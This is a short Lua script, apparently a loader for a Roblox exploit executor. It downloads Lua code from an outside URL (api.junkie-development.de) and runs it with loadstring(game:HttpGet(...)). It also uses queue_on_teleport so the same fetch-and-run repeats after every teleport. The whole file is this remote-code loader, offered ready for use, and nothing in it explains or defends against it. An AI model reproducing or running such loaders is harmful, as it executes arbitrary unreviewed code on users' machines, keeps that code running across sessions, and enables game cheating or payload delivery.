if getgenv().AlreadyExecutedtozx then return end
getgenv().AlreadyExecutedtozx = true

local target_url = "https://api.junkie-development.de/api/v1/luascripts/public/b1d8d974eaf51d928591b7b0dba54887404c1e14e868f52995a8d24b668ad890/download"

task.spawn(function()
    local queue_on_teleport = (syn and syn.queue_on_teleport) or queue_on_teleport or queueonteleport
    if queue_on_teleport then
        pcall(function()
            queue_on_teleport('loadstring(game:HttpGet("' .. target_url .. '"))()')
        end)
    end
end)

pcall(function()
    loadstring(game:HttpGet(target_url))()
end)
